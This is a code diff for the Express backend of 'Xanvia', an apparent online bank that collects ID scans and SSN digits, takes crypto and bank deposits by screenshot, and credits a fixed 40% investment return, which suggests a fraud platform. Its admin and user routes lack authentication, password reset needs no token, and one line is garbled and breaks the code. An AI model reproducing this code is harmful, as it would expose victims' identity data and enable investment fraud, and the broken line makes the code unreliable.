@@ -114,7 +114,7 @@ pool.connect((err, client, release) => {
       ];
       for (let q of alterQueries) { try { await client.query(q); } catch (e) { } }
       await client.query(`INSERT INTO system_settings (key, value) VALUES ('btc_address', 'bc1q...xanvia'), ('bank_name', 'Chase Bank'), ('bank_account', '123456789'), ('bank_routing', '021000021') ON CONFLICT (key) DO NOTHING`);
-      release(); console.log('✅ Database Ready');
+      release();
     });
   }
 });
@@ -122,10 +122,8 @@ pool.connect((err, client, release) => {
 app.post('/api/register', kycUpload, async (req, res) => {
   try {
     const { name, email, password, phone, age, address, ssn_last4 } = req.body;
-    if (!email || !password || !name || !address || !ssn_last4 || !age) return res.status(400).json({ error: 'All fields required.' });
-    if (!req.files || !req.files['id_front'] || !req.files['id_back']) return res.status(400).json({ error: 'ID Front/Back required.' });
-    if (!email.toLowerCase().endsWith('@gmail.com')) return res.status(400).json({ error: 'Valid Gmail required.' });
-
+    if (!email || !password || !name || !address || !ssn_last4 || !age) return res.status(400).json({ error: 'All fields are required.' });
+    if (!req.files || !req.files['id_front'] || !req.files['id_back']) return res.status(400).json({ error: 'ID Front and Back required.' });
     const existingUser = await pool.query('SELECT id FROM users WHERE email = $1', [email.toLowerCase()]);
     if (existingUser.rows.length > 0) return res.status(400).json({ error: 'Email registered.' });
 
@@ -142,10 +140,10 @@ app.post('/api/register', kycUpload, async (req, res) => {
       [name, safeUsername, email.toLowerCase(), hashedPassword, phone, accountNumber, routingNumber, age, address, ssn_last4, idFrontPath, idBackPath, proofAddressPath]
     );
     const newUser = userResult.rows[0];
-    await pool.query(`INSERT INTO accounts (user_id, type, balance) VALUES ($1, 'checking', 0), ($1, 'savings', 0)`, [newUser.id]);
+    await pool.query(`INSERT INTO accounts (user_id, type, balance) VALUES ($1, 'checking', 0), ($1, 'savings', 0), ($1, 'loan', 0), ($1, 'brokerage', 0)`, [newUser.id]);
     await sendNotification(newUser.id, `Welcome to Xanvia, ${name}!`);
     res.json({ success: true, message: 'Account created!', user: newUser });
-  } catch (err) { res.status(500).json({ error: 'DB Error: ' + err.message }); }
+  } catch (err) { res.status(500).json({ error: 'Server Error: ' + err.message }); }
 });
 
 app.post('/api/login', async (req, res) => {
@@ -153,14 +151,12 @@ app.post('/api/login', async (req, res) => {
   try {
     const result = await pool.query('SELECT * FROM users WHERE (email = $1 OR username = $1) AND deleted = false', [identifier.toLowerCase()]);
     const user = result.rows[0];
-    if (!user || !(await bcrypt.compare(password, user.password))) return res.status(401).json({ error: 'Invalid credentials.' });
+    if (!user || !(await bcrypt.compare(password, user.password))) return res.status(401).json({ error: 'Invalid email or password.' });
     if (user.status === 'Frozen') return res.status(403).json({ error: 'Account frozen.' });
     user.has_bank = true; user.has_loan = true; user.has_investment = true;
     res.json({ success: true, user });
   } catch (err) { res.status(500).json({ error: 'Server error.' }); }
-});
-
-app.post('/api/auth/forgot-password', async (req, res) => {
+});condition ? true : falseapp.post('/api/auth/forgot-password', async (req, res) => {
   const { email } = req.body;
   try {
     const result = await pool.query('SELECT id, name FROM users WHERE email = $1', [email.toLowerCase()]);
@@ -169,22 +165,22 @@ app.post('/api/auth/forgot-password', async (req, res) => {
     await pool.query('UPDATE users SET password = $1 WHERE email = $2', [await bcrypt.hash(tempPassword, 10), email.toLowerCase()]);
     await sendEmail(email, 'Xanvia Password Reset', `<h2>Hello ${result.rows[0].name},</h2><p>Temp password: <b>${tempPassword}</b></p>`);
     res.json({ success: true, message: `Check email.` });
-  } catch (err) { res.status(500).json({ error: 'Error' }); }
+  } catch (err) { res.status(500).json({ error: 'Database error.' }); }
 });
 
 app.post('/api/user/change-password', async (req, res) => {
   const { userId, currentPassword, newPassword } = req.body;
   try {
     const result = await pool.query('SELECT password FROM users WHERE id = $1', [userId]);
-    if (!(await bcrypt.compare(currentPassword, result.rows[0].password))) return res.status(400).json({ error: 'Incorrect.' });
+    if (!(await bcrypt.compare(currentPassword, result.rows[0].password))) return res.status(400).json({ error: 'Incorrect current password.' });
     await pool.query('UPDATE users SET password = $1 WHERE id = $2', [await bcrypt.hash(newPassword, 10), userId]);
-    res.json({ success: true });
+    res.json({ success: true, message: 'Password updated.' });
   } catch (err) { res.status(500).json({ error: 'Error' }); }
 });
 
 app.get('/api/admin/users', async (req, res) => {
   try {
-    const result = await pool.query(`SELECT id, name, email, phone, status, age, address, ssn_last4, id_front, id_back, proof_of_address FROM users WHERE deleted = false ORDER BY created_at DESC`);
+    const result = await pool.query(`SELECT id, name, username, email, phone, status, created_at, age, address, ssn_last4, id_front, id_back, proof_of_address FROM users WHERE deleted = false ORDER BY created_at DESC`);
     res.json(result.rows);
   } catch (err) { res.status(500).json({ error: 'Error' }); }
 });
@@ -193,6 +189,16 @@ app.get('/api/user/:userId', async (req, res) => {
   try {
     const result = await pool.query('SELECT name, username, email, phone, account_number, routing_number, profile_pic FROM users WHERE id = $1', [req.params.userId]);
     res.json(result.rows[0] || {});
+  } catch (err) { res.status(500).json({ error: 'Error' }); }
+});
+
+app.post('/api/user/update', upload.single('profile_pic'), async (req, res) => {
+  const { userId, name, username, phone } = req.body;
+  const profilePicPath = req.file ? `/uploads/${req.file.filename}` : null;
+  try {
+    if (profilePicPath) await pool.query(`UPDATE users SET name = $1, username = $2, phone = $3, profile_pic = $4 WHERE id = $5`, [name, username.toLowerCase(), phone, profilePicPath, userId]);
+    else await pool.query(`UPDATE users SET name = $1, username = $2, phone = $3 WHERE id = $4`, [name, username.toLowerCase(), phone, userId]);
+    res.json({ success: true, message: 'Profile updated!' });
   } catch (err) { res.status(500).json({ error: 'Error' }); }
 });
 
@@ -205,9 +211,14 @@ app.get('/api/transactions/:userId', async (req, res) => {
 
 app.get('/api/accounts/:userId', async (req, res) => {
   try {
-    const query = `SELECT COALESCE(SUM(CASE WHEN type IN ('DEPOSIT') THEN amount WHEN type IN ('WITHDRAWAL', 'FEE', 'INTERNAL_TRANSFER') THEN -amount ELSE 0 END), 0) AS checking_balance FROM transactions WHERE user_id = $1 AND status = 'Approved'`;
+    const query = `
+      SELECT
+        COALESCE(SUM(CASE WHEN type IN ('DEPOSIT') THEN amount WHEN type IN ('WITHDRAWAL', 'FEE', 'INTERNAL_TRANSFER') THEN -amount ELSE 0 END), 0) AS checking_balance,
+        COALESCE(SUM(CASE WHEN type = 'LOAN_APPLICATION' THEN amount WHEN type IN ('LOAN_REPAYMENT', 'LOAN_TRANSFER') THEN -amount ELSE 0 END), 0) AS loan_balance
+      FROM transactions WHERE user_id = $1 AND status = 'Approved';
+    `;
     const result = await pool.query(query, [req.params.userId]);
-    res.json({ checking: parseFloat(result.rows[0].checking_balance) || 0, loan: 0 });
+    res.json({ checking: parseFloat(result.rows[0].checking_balance) || 0, loan: parseFloat(result.rows[0].loan_balance) || 0 });
   } catch (err) { res.status(500).json({ error: 'Error' }); }
 });
 
@@ -223,16 +234,34 @@ app.post('/api/admin/settings/update', async (req, res) => {
   const { bank_name, bank_account, bank_routing, btc_address } = req.body;
   try {
     await pool.query(`INSERT INTO system_settings (key, value) VALUES ('bank_name', $1), ('bank_account', $2), ('bank_routing', $3), ('btc_address', $4) ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value`, [bank_name, bank_account, bank_routing, btc_address]);
-    res.json({ success: true });
+    res.json({ success: true, message: 'Settings updated.' });
   } catch (err) { res.status(500).json({ error: 'Error' }); }
 });
 
 app.post('/api/loans/apply', async (req, res) => {
-  try { await pool.query(`INSERT INTO transactions (user_id, type, amount, status) VALUES ($1, 'LOAN_APPLICATION', $2, 'Pending')`, [req.body.userId, req.body.amount]); res.json({ success: true }); } catch (err) { res.status(500).json({ error: 'Error' }); }
+  const { userId, amount } = req.body;
+  try {
+    await pool.query(`INSERT INTO transactions (user_id, type, amount, status) VALUES ($1, 'LOAN_APPLICATION', $2, 'Pending')`, [userId, amount]);
+    await sendNotification(userId, `Loan application for $${amount} submitted.`);
+    res.json({ success: true, message: 'Application received.' });
+  } catch (err) { res.status(500).json({ error: 'Error' }); }
+});
+
+app.post('/api/loans/transfer', async (req, res) => {
+  const { userId, amount, destination, bankDetails } = req.body;
+  try {
+    const detailsToStore = destination === 'external' ? JSON.stringify(bankDetails) : destination;
+    await pool.query(`INSERT INTO transactions (user_id, type, amount, status, details) VALUES ($1, 'LOAN_TRANSFER', $2, 'Pending', $3)`, [userId, amount, detailsToStore]);
+    res.json({ success: true, message: 'Transfer pending approval.' });
+  } catch (err) { res.status(500).json({ error: 'Error' }); }
 });
 
 app.post('/api/loans/repay', async (req, res) => {
-  try { await pool.query(`INSERT INTO transactions (user_id, type, amount, status) VALUES ($1, 'LOAN_REPAYMENT', $2, 'Pending')`, [req.body.userId, req.body.amount]); res.json({ success: true }); } catch (err) { res.status(500).json({ error: 'Error' }); }
+  const { userId, amount } = req.body;
+  try {
+    await pool.query(`INSERT INTO transactions (user_id, type, amount, status) VALUES ($1, 'LOAN_REPAYMENT', $2, 'Pending')`, [userId, amount]);
+    res.json({ success: true, message: 'Repayment pending approval.' });
+  } catch (err) { res.status(500).json({ error: 'Error' }); }
 });
 
 app.post('/api/transfer/internal', async (req, res) => {
@@ -241,7 +270,7 @@ app.post('/api/transfer/internal', async (req, res) => {
     const balCheck = await pool.query(`SELECT COALESCE(SUM(CASE WHEN type IN ('DEPOSIT', 'LOAN_APPLICATION') THEN amount WHEN type IN ('WITHDRAWAL', 'LOAN_REPAYMENT', 'FEE', 'INTERNAL_TRANSFER') THEN -amount ELSE 0 END), 0) as balance FROM transactions WHERE user_id = $1 AND status = 'Approved'`, [userId]);
     if (parseFloat(balCheck.rows[0].balance) < amount) return res.status(400).json({ error: 'Insufficient funds.' });
     await pool.query(`INSERT INTO transactions (user_id, type, amount, status, reference, details) VALUES ($1, 'INTERNAL_TRANSFER', $2, 'Pending', $3, 'Transfer')`, [userId, amount, recipientAccount]);
-    res.json({ success: true });
+    res.json({ success: true, message: 'Transfer pending approval.' });
   } catch (err) { res.status(500).json({ error: 'Error' }); }
 });
 
@@ -249,14 +278,17 @@ app.get('/api/lookup-account/:accountNumber', async (req, res) => {
   try {
     const result = await pool.query('SELECT name FROM users WHERE account_number = $1', [req.params.accountNumber]);
     if (result.rows.length > 0) res.json({ success: true, name: result.rows[0].name });
-    else res.status(404).json({ error: 'Not found' });
+    else res.status(404).json({ error: 'Account not found' });
   } catch (err) { res.status(500).json({ error: 'Error' }); }
 });
 
 app.post('/api/deposit/request', upload.single('screenshot'), async (req, res) => {
+  const { userId, amount, targetAccount } = req.body;
+  if (!req.file) return res.status(400).json({ error: 'Screenshot required.' });
+  const imagePath = `/uploads/${req.file.filename}`;
   try {
-    await pool.query(`INSERT INTO transactions (user_id, type, amount, status, reference, proof_image) VALUES ($1, 'DEPOSIT', $2, 'Pending', $3, $4)`, [req.body.userId, req.body.amount, req.body.targetAccount, `/uploads/${req.file.filename}`]);
-    res.json({ success: true });
+    await pool.query(`INSERT INTO transactions (user_id, type, amount, status, reference, proof_image) VALUES ($1, 'DEPOSIT', $2, 'Pending', $3, $4)`, [userId, amount, targetAccount, imagePath]);
+    res.json({ success: true, message: 'Deposit submitted.' });
   } catch (err) { res.status(500).json({ error: 'Error' }); }
 });
 
@@ -269,19 +301,26 @@ app.post('/api/notifications/:userId/read', async (req, res) => {
 });
 
 app.get('/api/cards/:userId', async (req, res) => {
-  try { const result = await pool.query('SELECT * FROM cards WHERE user_id = $1', [req.params.userId]); res.json(result.rows); } catch (err) { res.status(500).json({ error: 'Error' }); }
+  try { const result = await pool.query('SELECT * FROM cards WHERE user_id = $1 ORDER BY created_at DESC', [req.params.userId]); res.json(result.rows); } catch (err) { res.status(500).json({ error: 'Error' }); }
 });
 
 app.post('/api/cards/request', async (req, res) => {
-  try { await pool.query(`INSERT INTO cards (user_id, card_type, status, last4) VALUES ($1, $2, 'Active', $3)`, [req.body.userId, req.body.cardType, Math.floor(1000 + Math.random() * 9000).toString()]); res.json({ success: true }); } catch (err) { res.status(500).json({ error: 'Error' }); }
+  const { userId, cardType } = req.body;
+  try {
+    const last4 = Math.floor(1000 + Math.random() * 9000).toString();
+    await pool.query(`INSERT INTO cards (user_id, card_type, status, last4) VALUES ($1, $2, 'Active', $3)`, [userId, cardType, last4]);
+    res.json({ success: true, message: 'Card created successfully!' });
+  } catch (err) { res.status(500).json({ error: 'Error' }); }
+});
+
+app.post('/api/cards/:cardId/toggle', async (req, res) => {
+  const { cardId } = req.params;
+  const { status } = req.body;
+  try { await pool.query('UPDATE cards SET status = $1 WHERE id = $2', [status, cardId]); res.json({ success: true, status }); } catch (err) { res.status(500).json({ error: 'Error' }); }
 });
 
 app.get('/api/assets', async (req, res) => {
   try { const result = await pool.query('SELECT * FROM investment_assets ORDER BY created_at DESC'); res.json(result.rows); } catch (err) { res.status(500).json({ error: 'Error' }); }
-});
-
-app.post('/api/admin/assets/add', async (req, res) => {
-  try { await pool.query(`INSERT INTO investment_assets (category, name, description, price, image_url) VALUES ($1, $2, $3, $4, $5)`, [req.body.category, req.body.name, req.body.description, req.body.price, req.body.image_url]); res.json({ success: true }); } catch (err) { res.status(500).json({ error: 'Error' }); }
 });
 
 app.get('/api/investments/:userId', async (req, res) => {
@@ -292,7 +331,11 @@ app.get('/api/investments/:userId', async (req, res) => {
       if (inv.status === 'Active' && inv.start_date && inv.maturity_date) {
         const totalExpectedProfit = parseFloat(inv.amount) * 1.4;
         if (new Date() >= new Date(inv.maturity_date)) currentProfit = totalExpectedProfit;
-        else if (new Date() > new Date(inv.start_date)) currentProfit = totalExpectedProfit * ((new Date() - new Date(inv.start_date)) / (new Date(inv.maturity_date) - new Date(inv.start_date)));
+        else if (new Date() > new Date(inv.start_date)) {
+          const totalDuration = new Date(inv.maturity_date) - new Date(inv.start_date);
+          const elapsed = new Date() - new Date(inv.start_date);
+          currentProfit = totalExpectedProfit * (elapsed / totalDuration);
+        }
       }
       return { ...inv, amount: parseFloat(inv.amount), profit: currentProfit.toFixed(2) };
     });
@@ -301,18 +344,22 @@ app.get('/api/investments/:userId', async (req, res) => {
 });
 
 app.post('/api/investments/deposit', upload.single('screenshot'), async (req, res) => {
+  const { userId, amount, reference, assetName, assetCategory, term } = req.body;
+  const imagePath = `/uploads/${req.file.filename}`;
+  const combinedDetails = `${assetName || 'General'}|${assetCategory || 'Crypto'}|${term || '7'}`;
   try {
-    await pool.query(`INSERT INTO transactions (user_id, type, amount, status, reference, proof_image, details) VALUES ($1, 'INVESTMENT_DEPOSIT', $2, 'Pending', $3, $4, $5)`, [req.body.userId, req.body.amount, req.body.reference, `/uploads/${req.file.filename}`, `${req.body.assetName}|${req.body.assetCategory}|${req.body.term || '7'}`]);
-    res.json({ success: true });
+    await pool.query(`INSERT INTO transactions (user_id, type, amount, status, reference, proof_image, details) VALUES ($1, 'INVESTMENT_DEPOSIT', $2, 'Pending', $3, $4, $5)`, [userId, amount, reference, imagePath, combinedDetails]);
+    res.json({ success: true, message: 'Investment pending approval.' });
   } catch (err) { res.status(500).json({ error: 'Error' }); }
 });
 
 app.post('/api/complaints', upload.single('attachment'), async (req, res) => {
+  const { userId, category, subject, message } = req.body;
+  const refNum = `CMP-${Math.floor(100000 + Math.random() * 900000)}`;
   try {
-    const refNum = `CMP-${Math.floor(100000 + Math.random() * 900000)}`;
-    const result = await pool.query(`INSERT INTO complaints (user_id, ref_number, category, subject, message) VALUES ($1, $2, $3, $4, $5) RETURNING id`, [req.body.userId, refNum, req.body.category, req.body.subject, req.body.message]);
-    await pool.query(`INSERT INTO chat_messages (complaint_id, sender, message) VALUES ($1, 'user', $2)`, [result.rows[0].id, req.body.message]);
-    res.json({ success: true, ref: refNum });
+    const result = await pool.query(`INSERT INTO complaints (user_id, ref_number, category, subject, message) VALUES ($1, $2, $3, $4, $5) RETURNING id`, [userId, refNum, category, subject, message]);
+    await pool.query(`INSERT INTO chat_messages (complaint_id, sender, message) VALUES ($1, 'user', $2)`, [result.rows[0].id, message]);
+    res.json({ success: true, message: 'Complaint submitted.', ref: refNum });
   } catch (err) { res.status(500).json({ error: 'Error' }); }
 });
 
@@ -350,4 +397,4 @@ app.get('/api/market', (req, res) => { res.json(marketCache); });
 
 app.get('*', (req, res) => res.sendFile(path.join(__dirname, '../index.html')));
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`🚀 Server running on ${PORT}`));
+app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
